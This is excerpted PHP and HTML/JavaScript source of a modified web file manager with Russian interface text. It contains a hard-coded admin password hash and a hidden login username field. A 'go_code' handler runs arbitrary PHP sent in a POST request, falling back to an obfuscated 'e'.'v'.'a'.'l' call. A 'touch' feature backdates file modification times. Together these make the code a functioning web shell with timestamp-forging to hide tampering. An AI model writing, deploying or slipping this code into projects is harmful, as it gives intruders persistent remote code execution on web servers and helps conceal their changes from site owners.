...
$auth_users = array(
    'admin' => '$2y$10$3tMtlvFWTpztaoMlfPm34ehdzB6wULpyIzdZ8bJFBwVgfLEtSeSVW'
);
                            ...
                            <div class="card-body">
                                <form class="form-signin" action="" method="post" autocomplete="off">
                                    ...
                                    <div class="mb-3" style="display:none">
                                        ...
                                        <input type="text" value="admin" class="form-control" id="fm_usr" name="fm_usr" required>
                                    </div>
...
if (!@is_dir($root_path)) $root_path = $_SERVER['DOCUMENT_ROOT'];
...
if ((isset($_SESSION[FM_SESSION_ID]['logged'], $auth_users[$_SESSION[FM_SESSION_ID]['logged']]) || !FM_USE_AUTH) && isset($_POST['ajax'], $_POST['token']) && !FM_READONLY) {
    ...
    // Go code
    if (isset($_POST['type']) && $_POST['type'] == "go_code") {
        global $cfg, $lang, $report_errors, $show_hidden_files, $lang_list, $hide_Cols, $theme;
        $filename = __DIR__.'/t_code.php';
        chdir('/'.$_POST['p']);
        if (is_writeable(__DIR__))
        {
            file_put_contents($filename, '<?php ' . $_POST['code']);
            include($filename);
            unlink($filename);
        } else {
            $s = 'e'.'v'.'a'.'l';
    ...
    // Touch file
    if (isset($_POST['type']) && $_POST['type'] == "touch_file") {
        global $cfg, $lang, $report_errors, $show_hidden_files, $lang_list, $hide_Cols, $theme;
        $filename = '/' . $_POST['p'] . '/' . $_POST['filename'];
        $time = strtotime($_POST['touch_to']);
        if (touch($filename, $time, $time)) echo 'ok';
            else echo 'error';
        exit;
    }
...
if (isset($_GET['php']) && !FM_READONLY) {
    ...
    <div class="col-md-8 offset-md-2 pt-3">
        <div class="card mb-2 <?php echo fm_get_theme(); ?>">
            <h6 class="card-header d-flex justify-content-between">
                <span><i class="fa fa-code"></i>  php</span>
                <a href="?p=<?php echo FM_PATH ?>" class="text-danger"><i class="fa fa-times-circle-o"></i> <?php echo lng('Cancel')?></a>
            </h6>
            <div class="card-body">
                <form id="js-settings-form" action="" method="post" data-type="ajax" onsubmit="return go_code(this)">
                    <input type="hidden" name="type" value="go_code">
                    <input type="hidden" name="p" value="<?=$_GET['p']?>">
                    <div class="form-group row">
                        <label for="js-language" class="col-sm-3 col-form-label">Код</label>
                        <div class="col-sm-5">
                            <textarea class="form-control" name="code" rows=10 placeholder="echo 123;"></textarea>
                        </div>
                    </div><br />
                    ...
                    <div class="mb-3 row">
                        <div class="col-sm-10">
                            <center>
                            <button type="submit" class="btn btn-success"> <i class="fa fa-check-circle"></i> Выполнить</button>
                        </center>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label for="js-language" class="col-sm-3 col-form-label">Результат</label>
                        <div class="col-sm-5">
    ...
    <div class="table-responsive">
        <table class="table table-bordered table-hover table-sm <?php echo $tableTheme; ?>" id="main-table">
            ...
            foreach ($folders as $f) {
                ...
                $modif_date = date('Y-m-d H:i:s', $modif_raw);
            ...
            foreach ($files as $f) {
                ...
                <tr>
                    ...
                    <td class="inline-actions">
                        ...
                        <a title="Touch" href="#" onclick="touch('<?php echo fm_enc(addslashes(FM_PATH)) ?>', '<?php echo fm_enc(addslashes($f)) ?>', '<?=$modif_date?>');return false;"><i class="fa fa-adjust" aria-hidden="true"></i></a>
...
function fm_show_nav_path($path)
{
    ...
    <nav class="navbar navbar-expand-lg <?php echo $getTheme; ?> mb-4 main-nav <?php echo $isStickyNavBar ?>">
        ...
        <div class="collapse navbar-collapse" id="navbarSupportedContent">
            ...
            <?php
            $path = fm_clean_path($path);
            $root_url = "<a href='?p=" . __DIR__ . "'><i class='fa fa-home' aria-hidden='true' title='" . FM_ROOT_PATH . "'></i></a>";
            ...
            <div class="col-xs-6 col-sm-7">
                <ul class="navbar-nav justify-content-end <?php echo fm_get_theme();  ?>">
                    ...
                    <li class="nav-item">
                                <a title="php" class="dropdown-item nav-link" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;php=1"><i class="fa fa-code" aria-hidden="true"></i> PHP</a>
                    </li>
                </ul>
            </div>
        </div>
...
<div id="wrapper" class="container-fluid">
    ...
    <!--Touch Modal -->
    <div class="modal modal-alert" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" role="dialog" id="touchDailog">
      <div class="modal-dialog" role="document">
        <form class="modal-content rounded-3 shadow <?php echo fm_get_theme(); ?>" method="post" data-type="ajax" data-action="" onsubmit="return touch_file(this)"  autocomplete="off">
          <div class="modal-body p-4 text-center">
            <h5 class="mb-3"><?php echo lng('Are you sure want to touch?') ?></h5>
            <p class="mb-1">
                <input type="hidden" name="type" value="touch_file">
                <input type="hidden" name="p" id="js-touch-p">
                <input type="hidden" class="js-touch-filename" name="filename">
                <input type="text" class="js-touch-filename" class="form-control" disabled required>
                <input type="text" name="touch_to" id="js-touch-value" class="form-control" required>
                <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">

                <div id="touch_result"></div>
            </p>
          </div>
          <div class="modal-footer flex-nowrap p-0">
            <button type="button" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0 border-end" data-bs-dismiss="modal"><?php echo lng('Cancel') ?></button>
...
<script>
    ...
    function touch(e, t, v) { $('#touch_result').html(''); if(t) { $("#js-touch-from").val(t);$('#js-touch-p').val(e); $('[name=touch_to]').val(v);$(".js-touch-filename").val(t); $("#touchDailog").modal('show'); } }
    ...
    function go_code($this) {
        let form = $($this);
        $($this).find('[type=submit]').attr('disabled', true);
        $.ajax({
            type: form.attr('method'), url: form.attr('action'), data: form.serialize()+"&token="+ window.csrf +"&ajax="+true,
            success: function (data) {$($this).find('[type=submit]').attr('disabled', false);$('[name=result]').val(data);},
            error: function() { $($this).find('[type=submit]').attr('disabled', false);}
        }); return false;
    }

    function touch_file($this) {
        let form = $($this);
        $($this).find('[type=submit]').attr('disabled', true);
        $.ajax({
            type: form.attr('method'), url: form.attr('action'), data: form.serialize()+"&token="+ window.csrf +"&ajax="+true,
            success: function (data) {
                ...
                if (data == 'ok') $('#touch_result').html('Touch выполнен успешно');
                    else $('#touch_result').html('Неизвестная ошибка :(');
            },
            error: function() { $($this).find('[type=submit]').attr('disabled', false);}
        }); return false;
    }
